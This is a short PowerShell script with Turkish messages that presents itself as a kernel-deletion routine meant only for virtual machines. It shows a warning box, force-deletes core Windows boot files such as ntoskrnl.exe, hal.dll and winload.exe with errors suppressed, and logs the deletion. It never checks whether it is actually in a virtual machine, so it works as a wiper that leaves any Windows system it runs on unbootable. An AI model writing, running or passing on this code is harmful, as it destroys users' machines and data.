# ============================================================
# EN – KERNEL SILME ISLEMI (SADECE VM'DE)
# ============================================================

Add-Type -AssemblyName System.Windows.Forms

try {
    [System.Windows.Forms.MessageBox]::Show(
        "KERNEL SILINIYOR!" + "`n`nBu islem VM'nin bir daha acilmamasina neden olur." + "`n`nSADECE SANAL MAKINE ICIN!",
        "EN - KERNEL YE",
        "OK",
        "Error"
    )

    $kernelFiles = @(
        "C:\Windows\System32\ntoskrnl.exe",
        "C:\Windows\System32\hal.dll",
        "C:\Windows\System32\winload.exe",
        "C:\Windows\System32\kdcom.dll",
        "C:\Windows\System32\pshed.dll"
    )

    foreach ($file in $kernelFiles) {
        if (Test-Path $file) {
            Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
            Write-Host "Silindi: $file" -ForegroundColor Red
        }
    }

    Write-Host "Kernel silindi. VM artik acilmaz." -ForegroundColor Red
    $log = "C:\EN_Log.txt"
    Add-Content -Path $log -Value "[$(Get-Date)] Kernel silindi."
} catch {
    Write-Host "Kernel silme hatasi: $_" -ForegroundColor Yellow
    $log = "C:\EN_Log.txt"
    Add-Content -Path $log -Value "[$(Get-Date)] Kernel silme hatasi: $_"
}